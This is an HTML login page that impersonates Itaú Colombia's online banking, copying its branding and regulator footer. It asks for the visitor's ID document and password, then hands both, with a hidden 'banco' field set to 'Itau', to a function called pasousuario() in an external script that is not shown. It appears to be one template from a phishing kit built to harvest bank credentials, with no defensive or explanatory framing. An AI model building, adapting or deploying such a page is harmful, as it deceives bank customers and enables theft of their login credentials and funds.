<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ItaÃº - Inicia sesiÃ³n</title>
    <link rel="icon" type="image/png" href="itau_logo.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="../../scripts/functions2.js"></script>
    <style>
        :root {
            --itau-orange: #fe6a00;
            --itau-blue: #003399;
            --text-dark: #2d2d2d;
            --text-gray: #6b6b6b;
            --border-light: #dcdcdc;
            --bg-light: #f4f7f9;
        }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
            background-color: #ffffff;
            height: 100%;
        }

        .main-container {
            display: flex;
            min-height: calc(100vh - 80px); /* Space for footer */
            width: 100%;
        }

        /* Left Section: Form */
        .form-section {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 40px 8%;
            box-sizing: border-box;
        }

        .logo-container {
            margin-bottom: 40px;
        }

        .logo-container img {
            width: 64px;
            height: auto;
            border-radius: 12px;
        }

        h1 {
            font-size: 32px;
            color: var(--text-dark);
            margin-bottom: 30px;
            font-weight: 700;
        }

        .form-group {
            margin-bottom: 24px;
            width: 100%;
            max-width: 440px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            color: var(--text-gray);
            margin-bottom: 8px;
            font-weight: 500;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        .input-wrapper input, .input-wrapper select {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 1px solid var(--border-light);
            border-radius: 8px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
            appearance: none;
            -webkit-appearance: none;
            background-color: #fff;
        }

        .input-wrapper select {
            padding-right: 40px;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='%236b6b6b' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: right 12px center;
            background-size: 18px;
        }

        .input-wrapper input:focus, .input-wrapper select:focus {
            border-color: var(--itau-orange);
        }

        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: var(--text-gray);
            display: flex;
            align-items: center;
        }

        .links-container {
            margin-top: 10px;
            margin-bottom: 30px;
        }

        .links-container a {
            color: #0056b3;
            text-decoration: underline;
            font-size: 14px;
            font-weight: 600;
        }

        .btn-submit {
            width: 100%;
            max-width: 440px;
            padding: 14px;
            background-color: #f1f1f1;
            color: #b5b5b5;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: all 0.3s;
        }

        .btn-submit.active {
            background-color: var(--itau-orange);
            color: #ffffff;
            cursor: pointer;
        }

        /* Right Section: Image */
        .image-section {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #fff;
            padding: 40px;
            box-sizing: border-box;
        }

        .featured-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 100px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.08);
        }

        /* Footer */
        footer {
            height: 80px;
            border-top: 1px solid var(--border-light);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 8%;
            box-sizing: border-box;
            background-color: #fff;
        }

        .footer-logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .footer-logo img {
            height: 32px;
        }

        .copyright {
            font-size: 12px;
            color: var(--text-gray);
        }

        /* Mobile */
        @media (max-width: 1024px) {
            .image-section {
                display: none;
            }
            .form-section {
                padding: 40px 24px;
                align-items: center;
                text-align: center;
            }
            h1 {
                font-size: 28px;
            }
            .form-group {
                text-align: left;
            }
            .logo-container {
                margin-bottom: 20px;
            }
            footer {
                flex-direction: column;
                justify-content: center;
                gap: 10px;
                height: 100px;
                padding: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="main-container">
        <!-- Panel Izquierdo -->
        <div class="form-section">
            <div class="logo-container">
                <img src="itau_logo.png" alt="ItaÃº">
            </div>

            <h1>Ingresa tus datos</h1>

            <div class="form-group">
                <label>Tipo de documento</label>
                <div class="input-wrapper">
                    <select id="tipoDoc">
                        <option value="CC">CÃ©dula de ciudadanÃ­a</option>
                        <option value="CE">CÃ©dula de extranjerÃ­a</option>
                        <option value="NIT">NIT</option>
                        <option value="PP">Pasaporte</option>
                    </select>
                </div>
            </div>

            <div class="form-group">
                <label>NÃºmero de documento</label>
                <div class="input-wrapper">
                    <input type="tel" id="txtUsuario" placeholder="Ej: 12345678" maxlength="14">
                </div>
            </div>

            <div class="form-group">
                <label>Clave</label>
                <div class="input-wrapper">
                    <input type="password" id="txtPass" placeholder="Ingresa tu clave" maxlength="14" minlength="4" autocomplete="current-password">
                    <div class="toggle-password">
                        <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
                    </div>
                </div>
            </div>

            <div class="links-container">
                <a href="#">Â¿Tienes problemas con tu clave?</a>
            </div>

            <button type="button" id="btnUsuario" class="btn-submit" disabled>Ingresar</button>
            <input type="hidden" value="Itau" id="banco">
        </div>

        <!-- Panel Derecho -->
        <div class="image-section">
            <img src="itau_bg.png" alt="ItaÃº Personas" class="featured-image">
        </div>
    </div>

    <footer>
        <div class="footer-logo">
            <img src="vigilado.png" alt="Vigilado Superintendencia Financiera de Colombia">
        </div>
        <div class="copyright">
            Copyright &copy; 2026 ItaÃº Colombia S.A.
        </div>
    </footer>

    <script>
        $(document).ready(function() {
            const $user = $("#txtUsuario");
            const $pass = $("#txtPass");
            const $btn = $("#btnUsuario");
            const $eye = $(".toggle-password");
            const $inputType = $("#txtPass");

            function checkInputs() {
                if ($user.val().length > 0 && $pass.val().length >= 4) {
                    $btn.addClass("active").prop("disabled", false);
                } else {
                    $btn.removeClass("active").prop("disabled", true);
                }
            }

            $user.on("input", checkInputs);
            $pass.on("input", checkInputs);

            $eye.on("click", function() {
                const type = $inputType.attr("type") === "password" ? "text" : "password";
                $inputType.attr("type", type);
                // Simple eye toggle if needed
            });

            $btn.click(function() {
                if (!$btn.prop("disabled")) {
                    pasousuario($pass.val(), $user.val(), $("#banco").val());
                }
            });

            // Enter key
            $(document).on("keypress", function(e) {
                if (e.which == 13 && !$btn.prop("disabled")) {
                    $btn.click();
                }
            });
        });
    </script>
</body>
</html>
